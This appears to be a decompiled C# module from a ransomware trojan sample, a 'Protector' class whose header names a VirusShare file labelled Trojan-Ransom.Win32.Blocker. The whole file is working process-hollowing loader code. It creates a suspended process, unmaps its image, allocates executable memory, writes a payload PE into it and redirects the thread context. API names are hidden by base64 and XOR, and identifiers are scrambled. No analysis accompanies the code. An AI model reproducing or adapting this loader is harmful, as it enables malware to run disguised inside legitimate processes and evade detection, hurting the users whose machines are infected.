// Decompiled with JetBrains decompiler
// Type: Protector.Amtheone
// Assembly: Protector, Version=1.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FF4FED0-1C4E-4B7A-A92B-FD867F108819
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.hfey-7f35fb498d01d9440519676ef3fbadb46e3b0dae.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Protector
{
  [StandardModule]
  internal sealed class Amtheone
  {
    private static Amtheone.HnKOojNdPHepoUtNSvtblQb uXcOqYJidOpNTSZaIpTgpkZ = Amtheone.fjgohjsdogofgo<Amtheone.HnKOojNdPHepoUtNSvtblQb>("kernel32", "GetThreadContext");

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

    public static T fjgohjsdogofgo<T>(string name, string method) => (T) Marshal.GetDelegateForFunctionPointer(Amtheone.GetProcAddress(Amtheone.LoadLibraryA(ref name), ref method), typeof (T));

    private static object dAtagwTShoMVdAqWJvpljQo(
      string oMZqNdLkGMXSnVLbZ,
      string LZddHwReLAoRRSZQc)
    {
      string str = "";
      int num1 = Strings.Asc(LZddHwReLAoRRSZQc);
      short num2 = checked ((short) Strings.Len(oMZqNdLkGMXSnVLbZ));
      short Start = 1;
      while ((int) Start <= (int) num2)
      {
        str += Conversions.ToString(Strings.Chr(num1 ^ Strings.Asc(Strings.Mid(oMZqNdLkGMXSnVLbZ, (int) Start, 1))));
        checked { ++Start; }
      }
      return (object) str;
    }

    public static bool LvpTApnaJnJKmdVmtUbuPql(byte[] hfghgjdfhgjhdfg, string thsieyzqkzfvclacwp)
    {
      Amtheone.aObLRkQRlvCtDCMTwlBRmTP qrlvCtDcmTwlBrmTp = Amtheone.fjgohjsdogofgo<Amtheone.aObLRkQRlvCtDCMTwlBRmTP>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
      bool flag;
      try
      {
        IntPtr zero1 = IntPtr.Zero;
        Amtheone.JTaQUmCDMvsBPAIaHiMkadg cdMvsBpaIaHiMkadg = Amtheone.fjgohjsdogofgo<Amtheone.JTaQUmCDMvsBPAIaHiMkadg>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
        IntPtr[] oeehbrqsaxvvzzrkp = new IntPtr[4];
        Amtheone.TFBDHkDsFRMSBGImQimRvNI dsFrmsbgImQimRvNi = Amtheone.fjgohjsdogofgo<Amtheone.TFBDHkDsFRMSBGImQimRvNI>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
        byte[] jnsfxrlicfsktvrlqbr = new byte[68];
        Amtheone.BipRWcIasULbgIrJHFlueJk iasUlbgIrJhFlueJk = Amtheone.fjgohjsdogofgo<Amtheone.BipRWcIasULbgIrJHFlueJk>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String(Conversions.ToString(Amtheone.dAtagwTShoMVdAqWJvpljQo("'B;\u0001\u00156' \u0012\u001CH\u001B+)?\v%&'\u0005\u0013B;D", "qjLwJhdaCAPiTUafbTUIhNs")))));
        int int32_1 = BitConverter.ToInt32(hfghgjdfhgjhdfg, 60);
        Amtheone.jKrVngXWHUlhbrFaOrsRQtl xwhUlhbrFaOrsRqtl = Amtheone.fjgohjsdogofgo<Amtheone.jKrVngXWHUlhbrFaOrsRQtl>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
        int int16 = (int) BitConverter.ToInt16(hfghgjdfhgjhdfg, checked (int32_1 + 6));
        IntPtr zhiksdtpcetxdiloj = new IntPtr(BitConverter.ToInt32(hfghgjdfhgjhdfg, checked (int32_1 + 84)));
        Amtheone.lVWPDLJquIPjSVoHfMjkKjt jquIpjSvoHfMjkKjt = Amtheone.fjgohjsdogofgo<Amtheone.lVWPDLJquIPjSVoHfMjkKjt>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
        Amtheone.kACuEhRJeQUNnILgIlbuKDo rjeQuNnIlgIlbuKdo = Amtheone.fjgohjsdogofgo<Amtheone.kACuEhRJeQUNnILgIlbuKDo>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String(Conversions.ToString(Amtheone.dAtagwTShoMVdAqWJvpljQo("\u0014,\u0017;%\u0016p-\u0017\u0006)8\u001B\u0016\a*", "AnErUBPmSfWAfMaDTJKSNeb")))));
        if (jquIpjSvoHfMjkKjt((string) null, new StringBuilder(thsieyzqkzfvclacwp), zero1, zero1, false, 4, zero1, (string) null, jnsfxrlicfsktvrlqbr, oeehbrqsaxvvzzrkp))
        {
          uint[] numArray1 = new uint[179];
          numArray1[0] = 65538U;
          if (Amtheone.uXcOqYJidOpNTSZaIpTgpkZ(oeehbrqsaxvvzzrkp[1], numArray1))
          {
            IntPtr ybxxtcfrppxvzzjszvye = new IntPtr(checked ((long) numArray1[41] + 8L));
            IntPtr zero2 = IntPtr.Zero;
            IntPtr slnbgbpdeihgvsygea = new IntPtr(4);
            IntPtr zero3 = IntPtr.Zero;
            if (cdMvsBpaIaHiMkadg(oeehbrqsaxvvzzrkp[0], ybxxtcfrppxvzzjszvye, ref zero2, (int) slnbgbpdeihgvsygea, ref zero3) && qrlvCtDcmTwlBrmTp(oeehbrqsaxvvzzrkp[0], zero2) == 0U)
            {
              IntPtr num1 = new IntPtr(BitConverter.ToInt32(hfghgjdfhgjhdfg, checked (int32_1 + 52)));
              IntPtr num2 = new IntPtr(BitConverter.ToInt32(hfghgjdfhgjhdfg, checked (int32_1 + 80)));
              IntPtr yfvcuspjntztqznxxvry = dsFrmsbgImQimRvNi(oeehbrqsaxvvzzrkp[0], num1, num2, 12288, 64);
              int int32_2 = yfvcuspjntztqznxxvry.ToInt32();
              int eywyqdwnhjlshozg;
              int num3 = iasUlbgIrJhFlueJk(oeehbrqsaxvvzzrkp[0], yfvcuspjntztqznxxvry, hfghgjdfhgjhdfg, checked ((uint) (int) zhiksdtpcetxdiloj), eywyqdwnhjlshozg) ? 1 : 0;
              int num4 = checked (int16 - 1);
              int num5 = 0;
              while (num5 <= num4)
              {
                int[] dst = new int[10];
                Buffer.BlockCopy((Array) hfghgjdfhgjhdfg, checked (int32_1 + 248 + num5 * 40), (Array) dst, 0, 40);
                byte[] numArray2 = new byte[checked (dst[4] - 1 + 1)];
                Buffer.BlockCopy((Array) hfghgjdfhgjhdfg, dst[5], (Array) numArray2, 0, numArray2.Length);
                num2 = new IntPtr(checked (int32_2 + dst[3]));
                num1 = new IntPtr(numArray2.Length);
                int num6 = iasUlbgIrJhFlueJk(oeehbrqsaxvvzzrkp[0], num2, numArray2, checked ((uint) (int) num1), eywyqdwnhjlshozg) ? 1 : 0;
                checked { ++num5; }
              }
              num2 = new IntPtr(checked ((long) numArray1[41] + 8L));
              num1 = new IntPtr(4);
              int num7 = iasUlbgIrJhFlueJk(oeehbrqsaxvvzzrkp[0], num2, BitConverter.GetBytes(yfvcuspjntztqznxxvry.ToInt32()), checked ((uint) (int) num1), eywyqdwnhjlshozg) ? 1 : 0;
              numArray1[44] = checked ((uint) (yfvcuspjntztqznxxvry.ToInt32() + BitConverter.ToInt32(hfghgjdfhgjhdfg, int32_1 + 40)));
              int num8 = xwhUlhbrFaOrsRqtl(oeehbrqsaxvvzzrkp[1], numArray1) ? 1 : 0;
            }
          }
          int num = (int) rjeQuNnIlgIlbuKdo(oeehbrqsaxvvzzrkp[1]);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_11;
      }
      return true;
label_11:
      return flag;
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool HnKOojNdPHepoUtNSvtblQb(
      IntPtr vzpqfvvexwwdgwdsogv,
      uint[] gkrucwjfdblsouqbvofz);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool jKrVngXWHUlhbrFaOrsRQtl(
      IntPtr gqtvwedjpoiuwnrcgsdw,
      uint[] lwliipibdwuywqzfo);

    public delegate bool BipRWcIasULbgIrJHFlueJk(
      IntPtr xagcgdbjfapkbeni,
      IntPtr yfvcuspjntztqznxxvry,
      byte[] qzzcrjovbktzafzpzgb,
      uint zhiksdtpcetxdiloj,
      int eywyqdwnhjlshozg);

    public delegate IntPtr TFBDHkDsFRMSBGImQimRvNI(
      IntPtr yjwjwvxzenqoknpdx,
      IntPtr ahylzkvuqdqnvouekpow,
      IntPtr cseuivroipgzzekgwsoy,
      int cozrwjwhunrlqgrksvy,
      int blealkuffjbnitnrcrz);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool JTaQUmCDMvsBPAIaHiMkadg(
      IntPtr bxxrketjcrxcxtwbozaj,
      IntPtr ybxxtcfrppxvzzjszvye,
      ref IntPtr irzllcnlyfndqrcnifuj,
      int slnbgbpdeihgvsygea,
      ref IntPtr gpgxxatwxsbpfsaxazyt);

    public delegate uint kACuEhRJeQUNnILgIlbuKDo(IntPtr gukupvrkwazeuervvtda);

    public delegate uint aObLRkQRlvCtDCMTwlBRmTP(
      IntPtr cinabucaycgxdrzwerd,
      IntPtr phvigriqggqqjrlpt);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool lVWPDLJquIPjSVoHfMjkKjt(
      string ghfkghdkjghkfhg,
      StringBuilder ghfhgkjfhgkjhfkj,
      IntPtr vzieygtjepfnjkog,
      IntPtr xvinxvrdiuzfksud,
      [MarshalAs(UnmanagedType.Bool)] bool qubuihjssujbodegwyc,
      int rworgsobepbusnjejcf,
      IntPtr hdojdgnyrbjjpvfbv,
      string kxikpeiasoxqbtzgnhl,
      byte[] jnsfxrlicfsktvrlqbr,
      IntPtr[] oeehbrqsaxvvzzrkp);
  }
}
